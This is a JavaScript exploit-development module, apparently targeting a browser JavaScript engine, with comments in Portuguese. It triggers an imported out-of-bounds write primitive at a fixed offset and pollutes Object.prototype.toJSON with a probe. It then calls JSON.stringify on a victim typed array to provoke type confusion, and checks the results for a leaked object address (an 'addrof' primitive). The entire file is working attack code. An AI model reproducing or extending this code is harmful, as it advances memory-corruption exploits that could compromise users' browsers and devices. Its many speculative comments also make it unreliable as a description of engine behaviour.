// js/script3/testArrayBufferVictimCrash.mjs (v20_Revival_GetterOnReturnedMarker)

import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_array_buffer_real,
    oob_write_absolute,
    clearOOBEnvironment
} from '../core_exploit.mjs';

export const FNAME_MODULE_TYPEDARRAY_ADDROF_V20_REVIVAL = "OriginalHeisenbug_TypedArrayAddrof_v20_Revival_Getter";

const VICTIM_BUFFER_SIZE = 256;
const LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET = 0x7C;
const OOB_WRITE_VALUE = 0xFFFFFFFF;

let object_to_leak_A_v20_rev = null;
let object_to_leak_B_v20_rev = null;
let victim_typed_array_ref_v20_rev = null; 
let probe_call_count_v20_rev = 0;
// Esta variável guardará a referência ao objeto 'this' da última sonda que encontrou confusão e era um marcador.
let last_confused_marker_this_v20_rev = null; 
const PROBE_CALL_LIMIT_V20_REV = 5;


function toJSON_TA_Probe_GetterOnMarker() {
    probe_call_count_v20_rev++;
    const call_num = probe_call_count_v20_rev;
    let current_call_details_obj = { // Objeto local para registrar detalhes desta chamada específica
        call_number: call_num,
        probe_variant: "TA_Probe_GetterOnMarker_v20_Revival",
        this_type: Object.prototype.toString.call(this),
        this_is_victim_array: (this === victim_typed_array_ref_v20_rev),
        this_is_prev_marker: (typeof this === 'object' && this !== null && this.hasOwnProperty('marker_id_v20_rev') && this.marker_id_v20_rev === `MARKER_CALL_${call_num - 1}`),
        getter_defined: false,
        direct_prop_set: false,
        error_in_probe: null
    };
    logS3(`[${current_call_details_obj.probe_variant}] Call #${call_num}. 'this' type: ${current_call_details_obj.this_type}. IsVictim? ${current_call_details_obj.this_is_victim_array}. IsPrevMarker? ${current_call_details_obj.this_is_prev_marker}`, "leak");

    // A variável global 'last_confused_marker_this_v20_rev' será atualizada apenas se condições específicas forem atendidas
    // ou no final para refletir a última chamada da sonda para fins de depuração geral.

    try {
        if (call_num > PROBE_CALL_LIMIT_V20_REV) {
            logS3(`[${current_call_details_obj.probe_variant}] Call #${call_num}: Probe call limit. Returning stop object.`, "warn");
            last_confused_marker_this_v20_rev = current_call_details_obj; // Captura o estado final antes de parar
            return { recursion_stopped_v20_rev: true };
        }

        if (call_num === 1 && current_call_details_obj.this_is_victim_array) {
            logS3(`[${current_call_details_obj.probe_variant}] Call #${call_num}: 'this' is victim_array. Returning new marker M${call_num}.`, "info");
            last_confused_marker_this_v20_rev = current_call_details_obj;
            return { marker_id_v20_rev: `MARKER_CALL_${call_num}` };
        } else if (current_call_details_obj.this_is_prev_marker && current_call_details_obj.this_type === '[object Object]') { 
            logS3(`[${current_call_details_obj.probe_variant}] Call #${call_num}: TYPE CONFUSION ON PREVIOUS MARKER (now 'this')! Marker ID: ${this.marker_id_v20_rev}. Defining getter & prop...`, "vuln");
            
            Object.defineProperty(this, 'leaky_A_getter', {
                get: function() {
                    logS3(`[${current_call_details_obj.probe_variant}] !!! Getter 'leaky_A_getter' on confused marker 'this' (originally M${this.marker_id_v20_rev.split('_')[2]}) FIRED !!!`, "vuln");
                    return object_to_leak_A_v20_rev;
                },
                enumerable: true,
                configurable: true
            });
            current_call_details_obj.getter_defined = true;
            
            this.leaky_B_direct = object_to_leak_B_v20_rev;
            current_call_details_obj.direct_prop_set = true;
            logS3(`[${current_call_details_obj.probe_variant}] Call #${call_num}: Getter and direct prop set on confused marker 'this'. Keys: ${Object.keys(this).join(',')}`, "info");
            
            last_confused_marker_this_v20_rev = this; // GUARDAR A REFERÊNCIA AO 'this' MODIFICADO
            return this; // Retornar o marcador modificado para que JSON.stringify o serialize
        } else if (current_call_details_obj.this_type === '[object Object]') {
            logS3(`[${current_call_details_obj.probe_variant}] Call #${call_num}: 'this' is an unexpected [object Object]. No special action.`, "warn");
            // Atualizar para refletir esta última chamada se ela for mais profunda que uma interação de marcador bem-sucedida
            if (!last_confused_marker_this_v20_rev || call_num > (last_confused_marker_this_v20_rev.call_number || 0) || !last_confused_marker_this_v20_rev.this_is_prev_marker ) {
               last_confused_marker_this_v20_rev = current_call_details_obj;
            }
             // Retornar um novo marcador para potencialmente continuar a cadeia se JSON.stringify continuar
            return { marker_id_v20_rev: `MARKER_CALL_${call_num}` };
        }

    } catch (e) {
        current_call_details_obj.error_in_probe = (current_call_details_obj.error_in_probe || "") + `ProbeErr: ${e.name}: ${e.message}`;
        if (!last_confused_marker_this_v20_rev || call_num >= (last_confused_marker_this_v20_rev.call_number || 0)) {
            last_confused_marker_this_v20_rev = current_call_details_obj;
        }
    }
    
    // Retorno genérico se nenhum dos caminhos acima for pego completamente
    if (!last_confused_marker_this_v20_rev || call_num >= (last_confused_marker_this_v20_rev.call_number || 0) ) {
       last_confused_marker_this_v20_rev = current_call_details_obj; // Garante que o último estado é capturado
    }
    return { marker_id_v20_rev: `MARKER_CALL_${call_num}`, generic_v20_rev_return: true }; 
}

export async function executeTypedArrayVictimAddrofTest_GetterOnReturnedMarker() {
    const FNAME_CURRENT_TEST = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V20_REVIVAL}.triggerAndLog`;
    logS3(`--- Initiating ${FNAME_CURRENT_TEST}: Heisenbug (GetterOnReturnedMarker) & Addrof ---`, "test", FNAME_CURRENT_TEST);
    document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V20_REVIVAL} Init...`;

    probe_call_count_v20_rev = 0;
    last_confused_marker_this_v20_rev = null; 
    victim_typed_array_ref_v20_rev = null; 
    object_to_leak_A_v20_rev = { marker: "ObjA_TA_v20rev", id: Date.now() }; 
    object_to_leak_B_v20_rev = { marker: "ObjB_TA_v20rev", id: Date.now() + Math.floor(Math.random() * 1000) };

    let errorCapturedMain = null;
    let stringifyOutput_parsed = null; 
    
    let addrof_Victim_A = { success: false, msg: "VictimA: Default" };
    let addrof_StringifyOutput_Getter = { success: false, msg: "StringifyOutput.leaky_A_getter: Default"};
    let addrof_StringifyOutput_Direct = { success: false, msg: "StringifyOutput.leaky_B_direct: Default"};

    const fillPattern = 0.20202020202020; // Reutilizado da v20 original

    try {
        await triggerOOB_primitive({ force_reinit: true });
        oob_write_absolute(LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET, OOB_WRITE_VALUE, 4);
        logS3(`  Critical OOB write to ${toHex(LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET)} performed.`, "info", FNAME_CURRENT_TEST);
        await PAUSE_S3(100);

        victim_typed_array_ref_v20_rev = new Uint8Array(new ArrayBuffer(VICTIM_BUFFER_SIZE)); 
        let float64_view_on_victim_buffer = new Float64Array(victim_typed_array_ref_v20_rev.buffer); 
        for(let i = 0; i < float64_view_on_victim_buffer.length; i++) float64_view_on_victim_buffer[i] = fillPattern + i;
        logS3(`STEP 2: victim_typed_array_ref_v20_rev (Uint8Array) created.`, "test", FNAME_CURRENT_TEST);
        
        const ppKey = 'toJSON';
        let originalToJSONDescriptor = Object.getOwnPropertyDescriptor(Object.prototype, ppKey);
        let pollutionApplied = false;

        try {
            Object.defineProperty(Object.prototype, ppKey, { value: toJSON_TA_Probe_GetterOnMarker, writable: true, configurable: true, enumerable: false });
            pollutionApplied = true;
            let rawStringifyOutput = JSON.stringify(victim_typed_array_ref_v20_rev); 
            logS3(`  JSON.stringify completed. Raw Stringify Output: ${rawStringifyOutput}`, "info", FNAME_CURRENT_TEST);
            try {
                // stringifyOutput_parsed será o objeto M1, com M2 (modificado) como uma de suas propriedades se a lógica funcionar.
                // Ou, se a P3 retornou 'this' (M2 modificado), e JSON.stringify decidiu serializar *esse* objeto retornado pela sonda
                // em vez do M1 original, então stringifyOutput_parsed seria M2 modificado.
                stringifyOutput_parsed = JSON.parse(rawStringifyOutput); 
            } catch (e_parse) {
                stringifyOutput_parsed = { error_parsing_stringify_output: rawStringifyOutput, parse_error: e_parse.message };
            }
            
            // last_confused_marker_this_v20_rev deve ser o 'this' (M2) da Call #3, modificado.
            logS3(`  EXECUTE: last_confused_marker_this_v20_rev (final state): ${last_confused_marker_this_v20_rev ? JSON.stringify(last_confused_marker_this_v20_rev) : 'N/A'}`, "leak", FNAME_CURRENT_TEST);

            let heisenbugOnReturnedMarker = false;
            if (last_confused_marker_this_v20_rev && 
                last_confused_marker_this_v20_rev.this_is_prev_marker && // Verifica se foi o marcador da P2
                last_confused_marker_this_v20_rev.this_type === "[object Object]") { // E se esse marcador foi confuso
                heisenbugOnReturnedMarker = true;
            }
             logS3(`  EXECUTE: Heisenbug on Returned Marker (M2 as 'this' in P3) ${heisenbugOnReturnedMarker ? "CONFIRMED" : "NOT Confirmed"}.`, heisenbugOnReturnedMarker ? "vuln" : "error", FNAME_CURRENT_TEST);
                
            logS3("STEP 3: Checking victim buffer (expected unchanged)...", "warn", FNAME_CURRENT_TEST);
            const val_A_victim = float64_view_on_victim_buffer[0];
            if (val_A_victim !== (fillPattern + 0)) addrof_Victim_A.msg = `Victim buffer[0] CHANGED! Val: ${val_A_victim}`; else addrof_Victim_A.msg = `Victim buffer[0] unchanged.`;
            
            logS3("STEP 4: Checking stringifyOutput_parsed for leaked properties...", "warn", FNAME_CURRENT_TEST);
            // stringifyOutput_parsed é o resultado da serialização de M1. M1 tem uma propriedade 'payload' que é M2.
            // Se M2 foi modificado com leaky_A_getter e leaky_B_direct, e M2 foi retornado pela P3,
            // então stringifyOutput_parsed = M1, onde M1.payload = M2_modificado.
            // Ou, se P3 retornou 'this' (M2 modificado), e JSON.stringify decidiu usar esse valor como o resultado final, então stringifyOutput_parsed = M2_modificado.
            let targetObjectForLeakCheck = null;
            if (stringifyOutput_parsed && stringifyOutput_parsed.marker_id_v20_rev === "MARKER_CALL_1" && stringifyOutput_parsed.payload && stringifyOutput_parsed.payload.marker_id_v20_rev === "MARKER_CALL_2") {
                targetObjectForLeakCheck = stringifyOutput_parsed.payload; // Checando M2 dentro de M1
                 logS3("   stringifyOutput_parsed seems to be M1 containing M2. Checking M2 (payload).", "info");
            } else if (stringifyOutput_parsed && stringifyOutput_parsed.marker_id_v20_rev === "MARKER_CALL_2") {
                targetObjectForLeakCheck = stringifyOutput_parsed; // Checando se stringifyOutput é M2
                 logS3("   stringifyOutput_parsed seems to be M2 directly. Checking it.", "info");
            }


            if (targetObjectForLeakCheck) {
                const val_getter = targetObjectForLeakCheck.leaky_A_getter; // Acessar para disparar o getter
                if (typeof val_getter === 'number' && val_getter !==0) {
                    let getter_int64 = new AdvancedInt64(new Uint32Array(new Float64Array([val_getter]).buffer)[0], new Uint32Array(new Float64Array([val_getter]).buffer)[1]);
                    if (getter_int64.high() < 0x00020000 || (getter_int64.high() & 0xFFFF0000) === 0xFFFF0000) {
                       addrof_StringifyOutput_Getter.success = true; addrof_StringifyOutput_Getter.msg = `Possible pointer from getter: ${getter_int64.toString(true)}`;
                    } else { addrof_StringifyOutput_Getter.msg = `Getter value is num but not ptr: ${val_getter}`; }
                } else if (val_getter === object_to_leak_A_v20_rev) {
                     addrof_StringifyOutput_Getter.success = true; addrof_StringifyOutput_Getter.msg = "object_to_leak_A_v20_rev identity from getter.";
                } else { addrof_StringifyOutput_Getter.msg = `Getter value not ptr. Val: ${val_getter}`; }

                const val_direct = targetObjectForLeakCheck.leaky_B_direct;
                if (typeof val_direct === 'number' && val_direct !==0) {
                    let direct_int64 = new AdvancedInt64(new Uint32Array(new Float64Array([val_direct]).buffer)[0], new Uint32Array(new Float64Array([val_direct]).buffer)[1]);
                     if (direct_int64.high() < 0x00020000 || (direct_int64.high() & 0xFFFF0000) === 0xFFFF0000) {
                       addrof_StringifyOutput_Direct.success = true; addrof_StringifyOutput_Direct.msg = `Possible pointer from direct prop: ${direct_int64.toString(true)}`;
                    } else { addrof_StringifyOutput_Direct.msg = `Direct prop value is num but not ptr: ${val_direct}`; }
                } else if (val_direct === object_to_leak_B_v20_rev) {
                     addrof_StringifyOutput_Direct.success = true; addrof_StringifyOutput_Direct.msg = "object_to_leak_B_v20_rev identity from direct prop.";
                } else { addrof_StringifyOutput_Direct.msg = `Direct prop value not ptr. Val: ${val_direct}`; }
            } else {
                addrof_StringifyOutput_Getter.msg = "Target object for leak check not found in stringifyOutput_parsed.";
                addrof_StringifyOutput_Direct.msg = "Target object for leak check not found in stringifyOutput_parsed.";
                logS3(`   stringifyOutput_parsed was not an expected marker structure. Content: ${JSON.stringify(stringifyOutput_parsed)}`, "warn");
            }

            if (addrof_StringifyOutput_Getter.success || addrof_StringifyOutput_Direct.success) {
                document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V20_REVIVAL}: AddrInMarker SUCCESS!`;
            } else if (heisenbugOnReturnedMarker) {
                document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V20_REVIVAL}: MarkerTC OK, Addr Fail`;
            } else {
                 document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V20_REVIVAL}: No MarkerTC?`;
            }

        } catch (e_str) {
            errorCapturedMain = e_str;
            document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V20_REVIVAL}: Stringify/Addrof ERR`;
        } finally {
            if (pollutionApplied) {
                if (originalToJSONDescriptor) Object.defineProperty(Object.prototype, ppKey, originalToJSONDescriptor); else delete Object.prototype[ppKey];
            }
        }
    } catch (e_outer_main) {
        errorCapturedMain = e_outer_main;
        document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V20_REVIVAL} CRITICAL FAIL`;
    } finally {
        clearOOBEnvironment();
        logS3(`--- ${FNAME_CURRENT_TEST} Completed ---`, "test", FNAME_CURRENT_TEST);
        logS3(`Total probe calls: ${probe_call_count_v20_rev}`, "info", FNAME_CURRENT_TEST);
        logS3(`Addrof Victim A: ${addrof_Victim_A.msg}`, "info", FNAME_CURRENT_TEST);
        logS3(`Addrof StringifyOutput Getter: Success=${addrof_StringifyOutput_Getter.success}, Msg='${addrof_StringifyOutput_Getter.msg}'`, addrof_StringifyOutput_Getter.success ? "good" : "warn", FNAME_CURRENT_TEST);
        logS3(`Addrof StringifyOutput Direct: Success=${addrof_StringifyOutput_Direct.success}, Msg='${addrof_StringifyOutput_Direct.msg}'`, addrof_StringifyOutput_Direct.success ? "good" : "warn", FNAME_CURRENT_TEST);
        
        victim_typed_array_ref_v20_rev = null; 
        last_confused_marker_this_v20_rev = null;
        probe_call_count_v20_rev = 0;
    }
    return { 
        errorOccurred: errorCapturedMain, 
        potentiallyCrashed: false, 
        stringifyResult: stringifyOutput_parsed, 
        // toJSON_details idealmente seria o last_confused_marker_this_v20_rev, mas vamos usar o que foi capturado globalmente e copiado
        toJSON_details: last_confused_marker_this_v20_rev ? JSON.parse(JSON.stringify(last_confused_marker_this_v20_rev)) : null,
        total_probe_calls: probe_call_count_v20_rev,
        addrof_StringifyOutput_Getter: addrof_StringifyOutput_Getter,
        addrof_StringifyOutput_Direct: addrof_StringifyOutput_Direct,
    };
}
